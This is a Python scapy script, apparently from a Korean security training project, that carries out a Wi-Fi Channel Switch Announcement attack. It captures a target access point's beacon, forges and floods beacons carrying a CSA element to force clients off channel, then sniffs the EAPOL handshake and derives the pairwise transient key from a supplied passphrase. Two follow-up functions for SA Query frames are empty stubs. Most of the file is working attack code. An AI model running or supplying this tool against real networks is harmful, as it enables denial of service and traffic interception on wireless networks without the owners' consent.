import parse
import keygen
import sys
import os
import time
from scapy.all import *

ALGO_OPEN_AUTH = 0  # OPN
START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"
conf.verb=0

csa_frame = None
ssid = None
interface = None
passphrase = None
channel = None
sta_mac = None
ap_mac = None

#######################################################################################################
#                                       Description
# python3 mijeong.py mon0 KITRI_DEV2.4 guest1234! 13 2c:6d:c1:32:90:ba
#               공격방법
# 1. CSA Attack
# 2. Capture EAPOL and Generate PTK
# 3. Send CSA Again
# 4. while True:
#       capture SA_Request
#       send SA_Response
#######################################################################################################

def channel_switch(interface, channel):
	print(WARN_STR+" Channel Switching : Ch."+str(channel))
	os.system('iwconfig ' + interface + ' channel ' + str(channel))

def capture_SA_Request():
	y=3

def send_SA_Response():
	x=3
#######################################################################################################
#									  CAPTURE EAPOL
def capture_EAPOL():
	parser = parse.PARSER(sta_mac, ap_mac)
	sniff(iface=interface, stop_filter = parser.get_info, timeout=15)
	return parser


#######################################################################################################
#									   CSA ATTACK

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if bytes(ssid,'utf-8') == elt.info:
			print("\t"+INFO_STR+" CAPTURED BEACON FRAME !!!")
			global ap_mac
			ap_mac = dot11.addr3
			make_beacon_csa(elt, dot11)
			return True
	return False

def make_beacon_csa(elt, dot11):
	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	beacon = Dot11Beacon(cap=0o411)
	frame = RadioTap()/dot11_beacon/beacon
	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,100,1]))
	flag = False

	while elt != None:
		if elt.ID > 37 and flag == False:
			flag = True
			frame = frame/csa
		information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
		frame = frame/information_element
		elt = elt.payload.getlayer(Dot11Elt)
	global csa_frame
	csa_frame = frame
	
 
def send_CSA():
	channel_switch(interface, channel)
	print(SYSTEM_STR+" CAPTUREING BEACON FRAME !!!")
	sniff(iface=interface, stop_filter = stop_filter_beacon)
	sendp(csa_frame, iface=interface, count = 200, inter=0.004)
	print(SYSTEM_STR+" CSA ATTACK DONE !!!")
 
#######################################################################################################
#									  GENERATE PTK

def generate_ptk(parser):    
	key_gen_obj = keygen.KEY_GENERATOR(parser, ssid, passphrase)
	pmk = key_gen_obj.gen_PMK()
	ptk = key_gen_obj.gen_PTK(pmk)
	mics = key_gen_obj.gen_mics(ptk, parser.data) 
	if key_gen_obj.verify_mics(mics, parser):
		return ptk
	else:
		return None

#######################################################################################################

if __name__ == '__main__':
	interface = sys.argv[1]
	ssid = sys.argv[2]
	passphrase = sys.argv[3]
	channel = sys.argv[4]
	sta_mac = sys.argv[5]
	ptk = None
	
	while ptk == None:
		send_CSA()
		parser = capture_EAPOL()
		if not parser.all_satisfied():
			continue
		print(SYSTEM_STR+" ALL EAPOL CAPTURED!!!")
		ptk = generate_ptk(parser)
	
	#send_CSA(ssid)
	#capture_SA_Request()